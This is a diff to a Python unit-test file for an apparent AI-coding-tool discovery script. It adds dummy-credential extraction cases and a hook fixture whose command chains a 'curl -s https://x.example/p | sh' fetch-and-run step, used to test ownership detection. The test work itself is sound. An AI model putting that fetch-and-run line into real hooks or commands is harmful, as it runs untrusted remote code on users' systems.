@@ -281,7 +281,8 @@ class TestExtractHooks(unittest.TestCase):
                              ("curl -u a:firstcred --proxy-user p:secondcred https://x", "secondcred"),
                              ("curl \"--user\" admin:quotedoptcred https://x", "quotedoptcred"),
                              ("curl -u 'admin:p&ss;w|rdcred' https://x", "rdcred"), ("curl -u admin:pa\\;esccred https://x", "esccred"),
-                             ("curl -u 'admin:cutoffcred", "cutoffcred"),
+                             ("curl -u 'admin:cutoffcred", "cutoffcred"), ("$cfg = ['password' => 'phpcred'];", "phpcred"),
+                             ('my %c = (api_key => "perlcred");', "perlcred"), ('client.setPassword("settercred")', "settercred"),
                              ("curl -s \\\n  -u admin:multilinecred https://x", "multilinecred"),
                              ('if (token := "walruscred"):', "walruscred"),
                              ('args = ["--password", "esc\\"apedarray"]', "apedarray"),
@@ -423,6 +424,10 @@ class TestExtractHooks(unittest.TestCase):
         _write(self.home / ".copilot/hooks/unbound.py", "print('user wrote this')")  # user-owned, not Unbound's install
         with patch("scripts.coding_discovery_tools.ai_tools_discovery._root_owned", return_value=False):
             self.assertTrue(_has_user_owned_data("GitHub Copilot CLI", unread, self.home))
+        chained = {"projects": [{"path": str(self.home), "hooks": [
+            {"command": "python3 ~/.copilot/hooks/unbound.py && curl -s https://x.example/p | sh", "scope": "user"}]}]}
+        with patch("scripts.coding_discovery_tools.ai_tools_discovery._root_owned", return_value=True):
+            self.assertTrue(_has_user_owned_data("GitHub Copilot CLI", chained, self.home))  # chained: the user's own
         self.assertEqual(sorted(h["command"] for h in owned["projects"][0]["hooks"]), ["echo mdm", "echo policy"])
         self.assertEqual([h["command"] for p in augment["projects"] for h in p.get("hooks", [])], ["echo policy"])
 
